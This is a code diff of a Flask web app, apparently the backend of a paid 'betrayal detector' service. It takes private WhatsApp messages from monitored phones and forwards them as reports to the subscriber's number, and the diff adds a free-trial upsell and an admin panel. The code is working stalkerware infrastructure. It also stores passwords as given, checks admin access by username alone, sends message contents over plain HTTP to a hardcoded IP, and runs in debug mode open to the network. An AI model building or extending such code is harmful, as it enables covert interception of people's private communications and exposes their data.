@@ -78,7 +78,7 @@ def register():
         elif numero.startswith('55'):
             numero = numero[2:]
 
-        # Validar o número (deve ter 10 ou 11 dígitos após remover +55 ou 55)
+        # Validar o número
         if not re.match(r'^\d{10,11}$', numero):
             return render_template('register.html', erro="Número de WhatsApp inválido. Use o formato com DDD (ex: 5512345678900 ou +5512345678900).")
 
@@ -99,15 +99,14 @@ def register():
         try:
             conn = get_db()
             cur = conn.cursor()
-            # Inserir o usuário com o número original e confirmação pendente
-            cur.execute("INSERT INTO usuarios (username, password, plano, whatsapp_pai, telefones_monitorados, confirmado) VALUES (%s, %s, %s, %s, %s, %s)",
-                        (username, password, 'Gratuito', f"+55{numero_original}", [], False))
+            cur.execute("INSERT INTO usuarios (username, password, plano, whatsapp_pai, telefones_monitorados, confirmado, data_criacao) VALUES (%s, %s, %s, %s, %s, %s, %s)",
+                        (username, password, 'Gratuito', f"+55{numero_original}", [], False, datetime.now()))
             conn.commit()
             conn.close()
         except psycopg2.IntegrityError:
             return render_template('register.html', erro="Usuário já existe.")
 
-        # Enviar mensagens de confirmação para as três variações
+        # Enviar mensagens de confirmação
         for num in set(numeros_para_confirmacao):
             try:
                 confirmacao_url = f"https://detectordetraicao.digital/confirmar-numero/{num}"
@@ -161,7 +160,7 @@ def painel():
     conn = get_db()
     cur = conn.cursor()
 
-    cur.execute("SELECT plano, telefones_monitorados, whatsapp_pai, confirmado FROM usuarios WHERE id = %s", (current_user.id,))
+    cur.execute("SELECT plano, telefones_monitorados, whatsapp_pai, confirmado, data_criacao FROM usuarios WHERE id = %s", (current_user.id,))
     row = cur.fetchone()
     conn.close()
 
@@ -169,18 +168,27 @@ def painel():
     filhos_raw = row[1] or []
     whatsapp_pai = row[2]
     confirmado = row[3]
+    data_criacao = row[4]
     filhos = [{"id": idx + 1, "numero_whatsapp": numero} for idx, numero in enumerate(filhos_raw)]
 
     limites = {
         "Gratuito": 1,
-        "Básico": 3,
-        "Premium": 10
+        "Pro": 1,
+        "Premium": 3
     }
     max_filhos = limites.get(plano, 1)
 
     mensagem_confirmacao = None
     if not confirmado:
         mensagem_confirmacao = "Por favor, clique no link enviado ao seu WhatsApp para confirmar seu número."
+
+    dias_restantes = None
+    mensagem_compra = None
+    if plano == "Gratuito" and data_criacao:
+        dias_passados = (datetime.now() - data_criacao).days
+        dias_restantes = max(0, 2 - dias_passados)
+        if dias_restantes == 0:
+            mensagem_compra = "Seu teste gratuito expirou! Compre agora: R$ 38,90/mês (1 celular) ou R$ 99,70/mês (3 celulares)."
 
     qr_code = None
     return render_template(
@@ -190,7 +198,9 @@ def painel():
         filhos=filhos,
         max_filhos=max_filhos,
         qr_code=qr_code,
-        mensagem_confirmacao=mensagem_confirmacao
+        mensagem_confirmacao=mensagem_confirmacao,
+        dias_restantes=dias_restantes,
+        mensagem_compra=mensagem_compra
     )
 
 @app.route("/excluir-filho/<int:filho_id>", methods=["POST"])
@@ -238,7 +248,7 @@ def adicionar_filho():
     if not re.match(r"^\+\d{12,13}$", numero):
         conn = get_db()
         cur = conn.cursor()
-        cur.execute("SELECT plano, telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
+        cur.execute("SELECT plano, telefones_monitorados, data_criacao FROM usuarios WHERE id = %s", (current_user.id,))
         resultado = cur.fetchone()
         plano = resultado[0]
         filhos = resultado[1] or []
@@ -263,8 +273,8 @@ def adicionar_filho():
 
     limites = {
         "Gratuito": 1,
-        "Básico": 3,
-        "Premium": 10
+        "Pro": 1,
+        "Premium": 3
     }
     max_filhos = limites.get(plano, 1)
 
@@ -417,60 +427,52 @@ def disparar_relatorios():
         conn = get_db()
         cur = conn.cursor()
 
-        print("Consultando usuários no banco de dados...")
-        cur.execute("SELECT id, whatsapp_pai, telefones_monitorados FROM usuarios WHERE whatsapp_pai IS NOT NULL")
+        cur.execute("SELECT id, whatsapp_pai, telefones_monitorados, plano, data_criacao FROM usuarios WHERE whatsapp_pai IS NOT NULL")
         usuarios = cur.fetchall()
-        print(f"Usuários encontrados: {usuarios}")
 
-        for user_id, whatsapp_pai, telefones_monitorados in usuarios:
-            print(f"Processando usuário {user_id}, whatsapp_pai: {whatsapp_pai}, telefones_monitorados: {telefones_monitorados}")
+        for user_id, whatsapp_pai, telefones_monitorados, plano, data_criacao in usuarios:
             if not telefones_monitorados:
-                print(f"Sem telefones monitorados para usuário {user_id}")
                 continue
+
+            # Verificar se o plano gratuito expirou
+            if plano == "Gratuito" and data_criacao:
+                dias_passados = (datetime.now() - data_criacao).days
+                if dias_passados > 2:
+                    continue  # Não enviar relatórios se o teste gratuito expirou
 
             for numero_filho in telefones_monitorados:
                 if not numero_filho.startswith("+"):
                     numero_filho = f"+{numero_filho}"
                 ultimos_8 = numero_filho[-8:]
-                print(f"Verificando mensagens para numero_filho: {numero_filho} (últimos 8: {ultimos_8})")
                 cur.execute("""
                     SELECT conteudo, horario FROM mensagens_monitoradas
                     WHERE RIGHT(numero_filho, 8) = %s
                     ORDER BY horario DESC
                 """, (ultimos_8,))
                 mensagens = cur.fetchall()
-                print(f"Mensagens para {numero_filho}: {mensagens} (count: {len(mensagens)})")
 
                 if not mensagens:
-                    print(f"Nenhuma mensagem encontrada para {numero_filho}, verificando dados brutos...")
-                    cur.execute("SELECT * FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s", (ultimos_8,))
-                    dados_brutos = cur.fetchall()
-                    print(f"Dados brutos para {numero_filho}: {dados_brutos}")
                     continue
 
                 corpo = f"Relatório de mensagens do número {numero_filho}:\n"
                 for conteudo, horario in mensagens:
                     corpo += f"[{horario.strftime('%d/%m/%Y %H:%M')}] {conteudo}\n"
-                print(f"Gerando relatório para {whatsapp_pai}: {corpo}")
 
                 if not whatsapp_pai.startswith("+"):
                     whatsapp_pai = f"+{whatsapp_pai}"
 
                 try:
-                    print(f"Enviando relatório para {whatsapp_pai} com corpo: {corpo[:100]}...")
                     response = requests.post("http://147.93.4.219:3000/enviar-relatorio", json={
                         "numero_destino": whatsapp_pai,
                         "mensagem": corpo
                     }, timeout=10)
                     response.raise_for_status()
-                    print(f"Relatório enviado para {whatsapp_pai} com status: {response.status_code} - {response.text}")
                     cur.execute("""
                         DELETE FROM mensagens_monitoradas
                         WHERE RIGHT(numero_filho, 8) = %s
                     """, (ultimos_8,))
                     conn.commit()
                 except Exception as e:
-                    print(f"Erro ao enviar relatório para {whatsapp_pai}: {str(e)}")
                     cur.execute("""
                         INSERT INTO log_erros (usuario_id, erro, data)
                         VALUES (%s, %s, %s)
@@ -484,6 +486,37 @@ def disparar_relatorios():
     finally:
         if conn:
             conn.close()
+
+@app.route('/admin', methods=['GET', 'POST'])
+@login_required
+def admin():
+    # Simples verificação de admin (pode ser reforçada com uma coluna is_admin na tabela usuarios)
+    if current_user.username != "admin":
+        return jsonify({"erro": "Acesso não autorizado"}), 403
+
+    conn = get_db()
+    cur = conn.cursor()
+
+    if request.method == 'POST':
+        user_id = request.form['id']
+        username = request.form['username']
+        plano = request.form['plano']
+        whatsapp_pai = request.form['whatsapp_pai']
+        confirmado = request.form['confirmado'] == 'True'
+        telefones_monitorados = request.form.getlist('telefones_monitorados[]')
+
+        cur.execute("""
+            UPDATE usuarios
+            SET username = %s, plano = %s, whatsapp_pai = %s, confirmado = %s, telefones_monitorados = %s
+            WHERE id = %s
+        """, (username, plano, whatsapp_pai, confirmado, telefones_monitorados, user_id))
+        conn.commit()
+
+    cur.execute("SELECT id, username, plano, whatsapp_pai, confirmado, telefones_monitorados, data_criacao FROM usuarios")
+    usuarios = cur.fetchall()
+    conn.close()
+
+    return render_template('admin.html', usuarios=usuarios)
 
 if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=5000)
